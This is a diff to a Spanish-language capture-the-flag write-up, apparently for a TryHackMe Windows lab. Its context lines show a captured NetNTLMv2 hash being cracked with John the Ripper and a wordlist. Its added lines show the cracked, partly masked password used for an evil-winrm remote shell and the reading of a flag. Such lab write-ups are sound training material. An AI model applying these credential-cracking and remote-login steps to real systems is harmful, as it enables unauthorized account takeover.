@@ -784,7 +784,6 @@ Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-20
     └─# cat hash_ntlmv2                                                            
     buse::WINDCORP:17bdc88837e1a3f6:252BE1A9FD74D654D03FB0BE43C29ABF:01010000000000007A200E8AE1F8D901D6714F65543A7D670000000002000800420051005200560001001E00570049004E002D004B004F0055004B0030005900330056004300370042000400140042005100520056002E004C004F00430041004C0003003400570049004E002D004B004F0055004B0030005900330056004300370042002E0042005100520056002E004C004F00430041004C000500140042005100520056002E004C004F00430041004C0008003000300000000000000001000000002000006DC166A2AEAC9526CC257F8662B825B98F1B92ED3AB6CD597DABF0C6106F2F030A00100000000000000000000000000000000000090000000000000000000000
 
-  
     ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
     └─# john hash_ntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt 
     Using default input encoding: UTF-8
@@ -796,8 +795,28 @@ Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-20
     Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
     Session completed. 
 
+  -Obtenemos sesion en la maquina victima
+  
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
+    └─# evil-winrm -i windcorp.thm -u buse -p uz------3131                      
+                                            
+    Evil-WinRM shell v3.5
+                                            
+    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                            
+    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                            
+    Info: Establishing connection to remote endpoint
+    *Evil-WinRM* PS C:\Users\buse\Documents> 
+    
+  -Leemos Flag 2
 
- 
+    *Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
+    THM{6f6---------------104ed804ad06c7c9b1}
+
+  -
+
+    
 
 
 
